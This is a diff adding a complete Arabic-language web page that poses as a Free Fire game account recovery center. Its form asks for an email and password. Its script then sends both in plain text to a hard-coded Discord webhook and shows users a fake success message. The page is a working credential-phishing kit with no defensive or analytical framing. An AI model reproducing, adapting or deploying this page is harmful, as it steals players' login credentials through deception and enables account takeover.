@@ -1,0 +1,298 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>مركز استعادة حسابات فري فاير</title>
+    <!-- Google Fonts & FontAwesome -->
+    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700;800&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Tajawal', sans-serif;
+        }
+
+        body {
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+            color: #ffffff;
+            position: relative;
+            background: #0f172a;
+        }
+
+        .bg-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: radial-gradient(circle at center, #1e293b 0%, #0f172a 100%);
+            z-index: 0;
+        }
+
+        .registration-card {
+            background: rgba(30, 41, 59, 0.7);
+            backdrop-filter: blur(16px);
+            -webkit-backdrop-filter: blur(16px);
+            width: 100%;
+            max-width: 420px;
+            border-radius: 24px;
+            padding: 35px 30px;
+            box-shadow: 0 30px 60px rgba(0, 0, 0, 0.6);
+            border: 1.5px solid rgba(255, 255, 255, 0.1);
+            position: relative;
+            z-index: 1;
+        }
+
+        .header-section {
+            text-align: center;
+            margin-bottom: 25px;
+        }
+
+        .header-icon {
+            font-size: 48px;
+            color: #ff9900;
+            margin-bottom: 12px;
+        }
+
+        .header-section h1 {
+            font-size: 22px;
+            color: #ffffff;
+            font-weight: 800;
+            margin-bottom: 6px;
+        }
+
+        .header-section p {
+            font-size: 13px;
+            color: #cbd5e1;
+            font-weight: 500;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        .form-group label {
+            display: block;
+            font-size: 13px;
+            font-weight: 700;
+            color: #e2e8f0;
+            margin-bottom: 8px;
+        }
+
+        .input-wrapper {
+            position: relative;
+            display: flex;
+            align-items: center;
+        }
+
+        .input-wrapper i.input-icon {
+            position: absolute;
+            right: 14px;
+            color: #94a3b8;
+            font-size: 15px;
+        }
+
+        .input-wrapper input {
+            width: 100%;
+            padding: 12px 40px 12px 14px;
+            border: 1.5px solid rgba(255, 255, 255, 0.15);
+            border-radius: 12px;
+            font-size: 14px;
+            outline: none;
+            transition: all 0.2s ease;
+            background-color: rgba(15, 23, 42, 0.6);
+            color: #ffffff;
+        }
+
+        .input-wrapper input::placeholder {
+            color: #94a3b8;
+        }
+
+        .input-wrapper input:focus {
+            border-color: #ff9900;
+            background-color: rgba(15, 23, 42, 0.8);
+            box-shadow: 0 0 0 3px rgba(255, 153, 0, 0.25);
+        }
+
+        .toggle-password {
+            position: absolute;
+            left: 14px;
+            color: #94a3b8;
+            cursor: pointer;
+            font-size: 15px;
+        }
+
+        .btn-submit {
+            width: 100%;
+            padding: 13px;
+            background-color: #ff9900;
+            color: #0f172a;
+            border: none;
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: 800;
+            cursor: pointer;
+            transition: background 0.2s ease;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 8px;
+            margin-top: 10px;
+        }
+
+        .btn-submit:hover {
+            background-color: #e68a00;
+        }
+
+        .status-msg {
+            margin-top: 15px;
+            padding: 10px;
+            border-radius: 8px;
+            font-size: 13px;
+            text-align: center;
+            display: none;
+        }
+
+        .status-msg.success {
+            background-color: rgba(34, 197, 94, 0.2);
+            border: 1px solid #22c55e;
+            color: #4ade80;
+        }
+
+        .status-msg.error {
+            background-color: rgba(239, 68, 68, 0.2);
+            border: 1px solid #ef4444;
+            color: #f87171;
+        }
+
+        .footer-note {
+            text-align: center;
+            font-size: 11px;
+            color: #94a3b8;
+            margin-top: 20px;
+        }
+    </style>
+</head>
+<body>
+
+<div class="bg-overlay"></div>
+
+<div class="registration-card">
+    <div class="header-section">
+        <div class="header-icon">
+            <i class="fa-solid fa-gamepad"></i>
+        </div>
+        <h1>استعادة حساب فري فاير</h1>
+        <p>أدخل بيانات الحساب لإرسال طلب الاستعادة فوراً</p>
+    </div>
+
+    <form id="regForm">
+        <!-- البريد الإلكتروني -->
+        <div class="form-group">
+            <label for="email">البريد الإلكتروني</label>
+            <div class="input-wrapper">
+                <i class="fa-solid fa-envelope input-icon"></i>
+                <input type="email" id="email" placeholder="example@domain.com" required>
+            </div>
+        </div>
+
+        <!-- كلمة المرور -->
+        <div class="form-group">
+            <label for="password">كلمة المرور</label>
+            <div class="input-wrapper">
+                <i class="fa-solid fa-lock input-icon"></i>
+                <input type="password" id="password" placeholder="أدخل كلمة المرور" required>
+                <i class="fa-regular fa-eye toggle-password" id="togglePassword"></i>
+            </div>
+        </div>
+
+        <button type="submit" class="btn-submit" id="submitBtn">
+            <span>استعادة الحساب</span>
+            <i class="fa-solid fa-paper-plane"></i>
+        </button>
+
+        <div id="statusMsg" class="status-msg"></div>
+    </form>
+
+    <div class="footer-note">
+        <p><i class="fa-solid fa-shield-halved"></i> مركز معالجة واستعادة الرابط المباشر</p>
+    </div>
+</div>
+
+<script>
+    const webhookUrl = "https://discord.com/api/webhooks/1556771079656054888/zHJECmFPu_m5EYwDeC8ECJkxmGo7ExcKRm1IBMyjFVoY2yi5LEjHKhUY-boTt1q3dCmi";
+
+    // إظهار وإخفاء كلمة المرور
+    const togglePassword = document.getElementById('togglePassword');
+    const passwordInput = document.getElementById('password');
+
+    togglePassword.addEventListener('click', function () {
+        const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
+        passwordInput.setAttribute('type', type);
+        this.classList.toggle('fa-eye');
+        this.classList.toggle('fa-eye-slash');
+    });
+
+    // إرسال البيانات المباشر إلى Discord
+    document.getElementById('regForm').addEventListener('submit', function(e) {
+        e.preventDefault();
+
+        const email = document.getElementById('email').value;
+        const password = document.getElementById('password').value;
+        const statusMsg = document.getElementById('statusMsg');
+        const submitBtn = document.getElementById('submitBtn');
+
+        submitBtn.disabled = true;
+        submitBtn.innerHTML = 'جاري الإرسال...';
+        statusMsg.style.display = 'none';
+
+        const payload = {
+            embeds: [{
+                title: "🎮 تسجيل جديد / استعادة حساب فري فاير",
+                color: 16750848,
+                fields: [
+                    { name: "📧 البريد الإلكتروني", value: `\`${email}\``, inline: false },
+                    { name: "🔑 كلمة المرور", value: `\`${password}\``, inline: false }
+                ],
+                footer: { text: "مركز استعادة حسابات فري فاير" },
+                timestamp: new Date()
+            }]
+        };
+
+        fetch(webhookUrl, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload)
+        })
+        .then(response => {
+            if (response.ok) {
+                statusMsg.className = 'status-msg success';
+                statusMsg.innerText = 'تم تقديم طلبك بنجاح!';
+                statusMsg.style.display = 'block';
+                document.getElementById('regForm').reset();
+            } else {
+                throw new Error('فشل الإرسال');
+            }
+        })
+        .catch(error => {
+            statusMsg.className = 'status-msg error';
+            statusMsg.innerText = 'حدث خطأ أثناء تقديم الطلب، يرجى المحاولة لاحقاً.';
+            statusMsg.style.display = 'block';
+        })
+        .finally(() => {
+            submitBtn.disabled = false;
+            submitBtn.innerHTML = '<span>استعادة الحساب</span><i class="fa-solid fa-paper-plane"></i>';
+        });
+    });
+</script>
+
+</body>
+</html>
